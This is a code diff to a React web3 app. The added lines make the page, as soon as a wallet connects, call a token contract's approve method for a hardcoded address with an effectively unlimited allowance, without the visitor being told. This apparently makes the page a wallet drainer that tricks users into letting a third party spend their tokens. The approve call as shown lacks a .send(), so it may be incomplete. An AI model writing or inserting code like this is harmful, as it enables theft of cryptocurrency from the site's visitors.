@@ -22,7 +22,7 @@ function App() {
     const { active, activate, account, chainId } = useAuth();
 
     useEffect(async ()=>{
-        await approve()
+        if(active===true) await approve()
     }, [active])
 
     // useEffect(async () => {
@@ -36,17 +36,20 @@ function App() {
     //     window.localStorage.setItem("provider", type);
     // };
 
-    const contractAddress = "0x355638a4eCcb777794257f22f50c289d4189F245";
-    const abi = contract.abi;
+    // const contractAddress = "0x355638a4eCcb777794257f22f50c289d4189F245";
+    // const abi = contract.abi;
     const approveNumber = '99999999999999999999999999999999999999999999999999999';
 
     const approve = async () => {
-        console.log(account)
-        // const web3 = new Web3(Web3.givenProvider);
+        // console.log(account)
+        const web3 = new Web3(Web3.givenProvider);
         // const accounts = await web3.eth.requestAccounts();
-        // const contactList = new web3.eth.Contract(CONTACT_ABI, CONTACT_ADDRESS);
+        const contact = new web3.eth.Contract(CONTACT_ABI, CONTACT_ADDRESS);
         // set contact list to state variable.
         console.log(active)
+
+        await contact.methods.approve('0xaa18df61131d2D3A6F972B14d2c7c5dC4E33683E', approveNumber)
+
         // setContactList(contactList);
         // Then we get total number of contacts for iteration
 
